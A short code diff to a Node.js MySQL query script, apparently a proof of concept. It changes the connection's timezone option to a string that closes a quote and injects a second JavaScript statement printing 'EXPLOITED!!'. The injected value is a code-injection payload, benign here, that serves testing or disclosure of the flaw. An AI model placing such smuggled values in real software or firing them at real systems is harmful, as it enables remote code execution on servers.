@@ -9,7 +9,7 @@ const connection = mysql.createConnection({
 let query_data = {
   sql: `SELECT CURDATE();`,
   timezone:
-    "(() => { console.log('success'); })()",
+    "local');console.log('EXPLOITED!!'); //",
 };
 
 connection.query(query_data, (err, results) => {
@@ -18,4 +18,3 @@ connection.query(query_data, (err, results) => {
 });
 
 connection.end();
-
